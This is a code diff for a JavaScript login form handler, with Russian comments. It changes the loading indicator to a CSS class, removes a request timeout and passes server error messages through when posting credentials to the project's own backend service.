@@ -5,8 +5,8 @@ document.addEventListener('DOMContentLoaded', function() {
     const loadingGif = document.getElementById('loading-gif');
     const errorElement = document.getElementById('error-message');
     
-    // Устанавливаем правильный путь к гифке
-    loadingGif.src = '/yomae/website/loading.gif';
+    // Скрываем гифку при загрузке
+    loadingGif.style.display = 'none';
     
     form.addEventListener('submit', function(e) {
         e.preventDefault();
@@ -19,16 +19,13 @@ document.addEventListener('DOMContentLoaded', function() {
             return;
         }
         
-        // Показываем анимацию загрузки
-        buttonText.textContent = 'Processing';
+        // Активируем состояние загрузки
+        loginButton.classList.add('loading');
         loadingGif.style.display = 'inline-block';
         loginButton.disabled = true;
         errorElement.style.display = 'none';
         
-        // Добавляем таймаут запроса
-        const controller = new AbortController();
-        const timeoutId = setTimeout(() => controller.abort(), 30000); // 30 секунд таймаут
-        
+        // Убираем таймаут (или устанавливаем разумное значение)
         fetch('https://yomae-service.onrender.com/process_login', {
             method: 'POST',
             headers: {
@@ -37,12 +34,14 @@ document.addEventListener('DOMContentLoaded', function() {
             body: JSON.stringify({
                 username: username,
                 password: password
-            }),
-            signal: controller.signal
+            })
         })
         .then(response => {
-            clearTimeout(timeoutId);
-            if (!response.ok) throw new Error('Server error');
+            if (!response.ok) {
+                return response.json().then(err => {
+                    throw new Error(err.message || 'Server error');
+                });
+            }
             return response.json();
         })
         .then(data => {
@@ -61,13 +60,12 @@ document.addEventListener('DOMContentLoaded', function() {
             }
         })
         .catch(error => {
-            clearTimeout(timeoutId);
             console.error('Error:', error);
-            showError(error.name === 'AbortError' ? 'Request timeout. Please try again.' : 'Server error. Please try again later.');
+            showError(error.message || 'Server error. Please try again later.');
         })
         .finally(() => {
             // Восстанавливаем кнопку
-            buttonText.textContent = 'Log In';
+            loginButton.classList.remove('loading');
             loadingGif.style.display = 'none';
             loginButton.disabled = false;
         });
